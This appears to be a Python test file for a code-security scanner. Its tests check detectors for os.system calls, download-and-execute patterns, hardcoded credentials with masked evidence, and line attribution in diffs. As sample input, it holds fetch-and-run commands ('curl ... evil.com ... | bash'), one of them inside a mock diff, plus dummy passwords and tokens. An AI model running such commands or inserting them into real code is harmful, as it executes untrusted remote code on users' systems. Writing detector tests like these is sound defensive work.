from backend.app.ai_devsec.schemas import ScanRequest
from backend.app.ai_devsec.service import run_scan, run_diff_scan

def test_dangerous_exec_detector_flags_os_system():
    code = 'import os\nos.system("whoami")\n'
    resp = run_scan(ScanRequest(code=code))
    detectors = {f.detector for f in resp.findings}
    assert "dangerous_exec" in detectors

def test_download_exec_detector_flags_curl_pipe_bash():
    code = 'os.system("curl https://evil.com/install.sh | bash")\n'
    resp = run_scan(ScanRequest(code=code))
    detectors = {f.detector for f in resp.findings}
    assert "download_exec" in detectors

def test_hardcoded_creds_detector_masks_evidence():
    code = 'password="admin123"\nAuthorization: Bearer abcdef123456\n'
    resp = run_scan(ScanRequest(code=code))
    hardcoded = [f for f in resp.findings if f.detector == "hardcoded_creds"]
    assert len(hardcoded) >= 1
    # Evidence should not reveal the real password/token
    for f in hardcoded:
        if f.evidence:
            assert "admin123" not in f.evidence
            assert "abcdef123456" not in f.evidence
            assert "***" in f.evidence

def test_diff_scan_includes_file_and_line():
    diff = (
        "diff --git a/app.py b/app.py\n"
        "+++ b/app.py\n"
        "@@ -1,1 +1,3 @@\n"
        "+ import os\n"
        '+ os.system("curl evil.com | bash")\n'
        " print(\"safe\")\n"
    )
    resp = run_diff_scan(diff)

    assert len(resp.findings) >= 1
    f = resp.findings[0]
    assert f.file == "app.py"
    assert f.line == 2
